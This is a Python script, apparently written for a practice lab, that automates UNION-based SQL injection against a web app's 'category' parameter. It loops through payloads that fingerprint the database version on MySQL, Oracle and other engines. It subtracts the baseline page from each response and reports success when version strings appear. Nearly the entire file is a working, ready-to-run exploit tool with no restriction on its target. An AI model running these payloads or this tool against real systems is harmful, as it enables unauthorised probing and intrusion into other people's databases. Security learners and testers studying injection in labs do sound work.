import requests
import re

def send_request(url, payload):
    params = {"category": payload}
    try:
        res = requests.get(url, params=params, timeout=5)
        return res.text
    except requests.exceptions.RequestException as e:
        print(f"[에러] 요청 실패: {e}")
        return ""
    


def generate_payloads():
    payloads = []

    payloads = [
        # MySQL
        "' UNION SELECT @@version, NULL#",
        "' UNION SELECT NULL, @@version#",
        "' UNION SELECT version(), NULL#",
        "' UNION SELECT NULL, version()#",

        # Others
        "' UNION SELECT @@version, NULL--+",
        "' UNION SELECT NULL, @@version--+",
        "' UNION SELECT version(), NULL--+",
        "' UNION SELECT NULL, version()--+",

        # Oracle
        "' UNION SELECT banner, NULL FROM v$version--+",
        "' UNION SELECT NULL, banner FROM v$version--+"
    ]
    return payloads

def clean_response(res, baseline):
    cleaned = res

    # baseline에 있는 내용 제거
    for line in baseline.splitlines():
        if line.strip():
            cleaned = cleaned.replace(line.strip(), "")

    return cleaned

def is_interesting_response(res):
    # DB 키워드
    db_keywords = ["Oracle", "PostgreSQL", "Microsoft", "SQL Server", "MariaDB", "MySQL"]

    # 버전 패턴 (예: 5.7.33, 8.0.31 등)
    version_pattern = r"\d+\.\d+(\.\d+)?"

    if any(k in res for k in db_keywords):
        return True

    if re.search(version_pattern, res):
        return True

    return False


def run_union(url):
    print("\n[UNION SQL Injection 테스트 시작]\n")

    baseline = send_request(url, "")

    payloads = generate_payloads()

    for payload in payloads:
        print(f"[테스트 중]: {payload}")

        res = send_request(url, payload)

        if not res:
            continue
        
        cleaned = clean_response(res, baseline)

        if is_interesting_response(cleaned):
            print("\n✅ 성공! 유의미한 응답 발견\n")
            ##print(res)
            return

    print("\n❌ 버전 정보 탐지 실패")
    print(cleaned)